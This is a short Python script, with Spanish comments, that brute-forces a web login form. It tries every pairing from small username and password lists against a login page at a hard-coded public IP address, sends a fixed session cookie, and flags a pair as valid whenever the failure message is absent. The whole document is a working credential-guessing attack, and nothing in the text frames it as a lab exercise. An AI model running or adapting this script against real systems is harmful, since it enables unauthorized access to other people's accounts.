import sys
import requests
from termcolor import colored, cprint

# Cookie
cookie = {
    "PHPSESSID": "q88d6p0330k5u5fs9ogbemc27a"
}

# Lista 
usuarios = ["20060001", "user1", "guest"]
contrasenas = ["dedede", "password", "admin123"]

# Bucle 
for usuario in usuarios:
    for contrasena in contrasenas:
        url = "http://35.222.177.84/sigea/index.php"
        data = {
            "login": usuario,
            "password": contrasena
        }

        # Solicitud POST
        response = requests.post(url, data=data, cookies=cookie)

        # Respuesta
        if "Username and/or password incorrect." not in response.text:
            cprint(f"VERIFICANDO {usuario}:{contrasena} es válido", "green", attrs=["bold"], file=sys.stderr)
        else:
            cprint(f"VERIFICANDO {usuario}:{contrasena} no es válido", "red", attrs=["bold"], file=sys.stderr)
